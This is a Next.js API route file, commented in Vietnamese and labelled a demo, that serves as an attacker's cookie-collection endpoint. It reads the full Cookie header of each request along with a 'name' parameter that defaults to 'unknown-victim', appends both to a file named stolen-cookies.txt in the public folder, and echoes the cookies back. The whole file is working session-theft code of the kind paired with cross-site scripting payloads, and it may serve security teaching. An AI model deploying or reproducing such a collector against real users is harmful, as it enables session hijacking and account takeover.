import { NextRequest, NextResponse } from "next/server";
import fs from "fs";
import path from "path";

// API demo: endpoint attacker dùng để lấy TOÀN BỘ cookie từ request
export async function GET(req: NextRequest) {
  const url = new URL(req.url);
  const name = url.searchParams.get("name") ?? "unknown-victim";

  // Cookie mà server thấy từ trình duyệt (Header Cookie)
  const serverCookies = req.headers.get("cookie") ?? "";

  // Lưu log vào file txt trong thư mục project
  try {
    const logPath = path.join(process.cwd(), "public/stolen-cookies.txt");
    const line = JSON.stringify({
      time: new Date().toISOString(),
      name,
      cookie: serverCookies,
    });
    fs.appendFileSync(logPath, line + "\n", { encoding: "utf8" });
  } catch (e) {
    // eslint-disable-next-line no-console
    console.error("Failed to write stolen-cookies.txt", e);
  }

  return NextResponse.json(
    {
      message:
        "Demo endpoint đã đọc toàn bộ Header Cookie và lưu vào stolen-cookies.txt (nếu ghi file thành công).",
      name,
      cookie: serverCookies,
    },
    { status: 200 }
  );
}

